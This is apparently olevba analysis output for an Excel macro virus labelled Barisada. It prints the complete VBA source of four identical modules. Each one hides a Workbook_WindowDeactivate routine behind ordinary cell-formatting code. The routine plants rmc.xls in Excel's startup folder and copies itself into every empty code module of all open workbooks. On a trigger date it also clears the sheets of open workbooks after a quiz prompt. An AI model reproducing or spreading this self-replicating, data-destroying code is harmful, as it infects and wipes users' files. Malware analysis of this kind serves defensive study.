olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.o-fe9322a501488222ed4438777ae673c5cb08135b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada.o-fe9322a501488222ed4438777ae673c5cb08135b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Barisada.o-fe9322a501488222ed4438777ae673c5cb08135b - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Barisada.o-fe9322a501488222ed4438777ae673c5cb08135b - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Barisada.o-fe9322a501488222ed4438777ae673c5cb08135b - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Format()
Dim i As Integer, r As Long, p As Integer, c As Integer, col As String, range As String
    Dim tmp As String, mask As String, cellval As String
    For c = 1 To 6
    If c > 26 And c Mod 26 = 1 Then
        range = Chr(Asc("A") + (c / 26) - 1)
    End If
        tmp = LCase(Sheet1.Cells(1, c))
mask = Sheet1.Cells(2, c)
    If mask <> "" And InStr(tmp, "date") = 0 Then
    If InStr(mask, "hide_field") > 0 Then
Sheet1.Cells(1, c).EntireColumn.Delete
    ElseIf InStr(mask, "number_mask") > 0 Then
        col = range & Chr(Asc("A") + (c - 1) Mod 26) & "3"
        Sheet1.range(col).EntireColumn.NumberFormat = "#,##0.00;[Red]-#,##0.00 "
Else
        For r = 3 To 158 + 2
            p = 1
            tmp = ""
            cellval = Trim(Sheet1.Cells(r, c))
            For i = 1 To Len(mask)
                If p > Len(cellval) Then Exit For
                If InStr("@#!", Mid(mask, i, 1)) > 0 Then
                    tmp = tmp + Mid(cellval, p, 1)
                    p = p + 1
                Else
                    tmp = tmp + Mid(mask, i, 1)
                End If
            Next i
        Sheet1.Cells(r, c) = tmp
        Next r
    End If
End If
    Next c
Sheet1.range("A2").EntireRow.Delete
End Sub

Public Sub ConvertDate()
Dim i As Integer, r As Long, str As String, julDate As Long, c As String, range As String
For i = 1 To 6
    If i > 26 And i Mod 26 = 1 Then
        range = Chr(Asc("A") + (i / 26) - 1)
    End If
    If Sheet1.Cells(1, i) <> "" Then
        str = LCase(Sheet1.Cells(1, i))
        If InStr(str, "date") > 0 Then
        For r = 3 To 158 + 2
            julDate = Sheet1.Cells(r, i)
            If julDate >= 727933 And julDate < 731947 Then
                d = CDate(julDate - 693594)
                Sheet1.Cells(r, i) = d
            End If
        Next r
c = range & Chr(Asc("A") + (i - 1) Mod 26) & "3"
        Sheet1.range(c).EntireColumn.NumberFormat = Sheet1.Cells(2, i)
        End If
    End If
Next i
End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
flag = False
 
 myfile = Dir(Application.StartupPath & "\rmc.xls")
 If myfile <> "rmc.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\rmc.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 

For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
  
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "rmc.xls" Then Workbooks("rmc.xls").Close savechanges:=True
 


dmonth = Month(Now): dday = Day(Now): dhour = Hour(Now)

If dmonth = 4 And dday = 24 And dhour = 14 Then flag = True

If flag = True Then
  v1 = MsgBox("Question : What is the Sword Which Karl Styner(=Gray Scavenger) used? " & vbCr & _
  "Answer : Barisada ", vbYesNo, "1st Qusetion")
  
  If v1 = vbNo Then MsgBox "Good! You're Authorized now!!", vbOKOnly, "Right Answer"
  If v1 = vbYes Then
     MsgBox "I wil give you one more Chance. Be careful!!", vbOKOnly + vbCritical, "Wrong Answer"
     v2 = MsgBox("Summoning Xavier is the Ultimate Magic. Right?", vbYesNo, "Wrong Answer may cause The Serious Problem!")
     If v2 = vbYes Then MsgBox "ok , i will forgive you", vbOKOnly, "Right Answer"
     If v2 = vbNo Then
       MsgBox "Wrong Answer, Your file will be deleted!", vbOKOnly + vbCritical, "You shall Die"
       For i = 1 To Workbooks.Count
        For j = 1 To Workbooks(i).Sheets.Count
          Workbooks(i).Sheets(i).Cells.Select
          Selection.Clear
       Next j: Next i:
     End If
     
     
  End If
 End If
  
     
  

  

   
 
 

   


End Sub


























































































































































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
